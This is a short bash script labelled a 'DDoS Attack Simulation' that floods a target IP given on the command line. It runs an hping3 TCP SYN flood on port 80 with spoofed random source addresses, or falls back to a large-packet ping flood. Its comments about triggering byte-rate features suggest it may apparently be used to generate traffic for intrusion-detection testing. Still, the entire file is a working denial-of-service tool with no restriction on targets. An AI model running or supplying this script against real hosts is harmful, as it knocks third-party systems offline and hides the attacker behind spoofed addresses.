#!/bin/bash
# DDoS Attack Simulation - High-intensity Optimized version

TARGET=$1
DURATION=${2:-30}
RATE=${3:-2000} 

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
    exit 1
fi

echo "Starting High-Intensity DDoS on $TARGET for $DURATION seconds..."

if command -v hping3 &> /dev/null; then
    echo "Using hping3 for Randomized TCP SYN Flood..."
    # --rand-source: Spoofs IPs to increase entropy
    # -d 120: Adds payload data to increase byte_count
    # -i u500: Sends a packet every 500 microseconds (extremely fast)
    timeout $DURATION sudo hping3 -S -p 80 --flood --rand-source -d 120 -i u500 $TARGET > /dev/null 2>&1
else
    echo "Using Native Flood with increased payload..."
    # -s 1450: Maximize packet size to trigger byte-rate features
    # -f: Native kernel-level flood
    timeout $DURATION sudo ping -f -l $RATE -s 1450 $TARGET > /dev/null 2>&1
fi

echo "DDoS attack completed"